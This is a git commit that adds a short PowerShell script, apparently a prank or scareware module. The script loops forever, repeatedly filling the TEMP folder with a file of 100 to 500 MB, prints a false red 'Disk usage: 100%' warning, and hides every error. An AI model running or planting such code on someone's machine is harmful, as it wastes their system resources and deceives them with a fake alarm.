de57c4bd4c325e08efa888d638cf553f89f0f9c3
CodeAnd-Art <3838yos4141@gmail.com>
2026-07-28 08:33:25 +0300

    Create modul_disk.ps1

---
+++ modul_disk.ps1
@@ -0,0 +1,13 @@
+while ($true) {
+    try {
+        $dosya = "$env:TEMP\temp_disk.bin"
+        $boyut = Get-Random -Min 100 -Max 500
+        $stream = [System.IO.File]::OpenWrite($dosya)
+        $stream.SetLength($boyut * 1MB)
+        $stream.Close()
+        Write-Host "Disk usage: 100%" -ForegroundColor Red
+        Start-Sleep -Milliseconds 500
+        Remove-Item $dosya -Force -ErrorAction SilentlyContinue
+    } catch {}
+    Start-Sleep -Seconds 2
+}
